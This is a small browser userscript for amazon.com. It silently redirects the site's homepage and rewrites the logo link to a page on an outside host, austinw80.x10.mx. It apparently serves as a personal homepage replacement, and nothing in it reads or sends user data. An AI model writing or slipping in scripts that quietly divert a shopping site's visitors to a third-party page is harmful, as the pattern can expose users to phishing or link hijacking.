// ==UserScript==

// @name           Amazon
// @namespace      Austin W80
// @match          http://www.amazon.com/*
// @run-at document-start
// ==/UserScript==


if (window.location.protocol!="view-source:"){
  if (window.location.href=="http://www.amazon.com/" || window.location.href=="http://www.amazon.com/ref=gno_logo") {
  window.location.href="http://austinw80.x10.mx/amazon.php";
  }
}

document.getElementById("navLogo").href="http://austinw80.x10.mx/amazon.php";

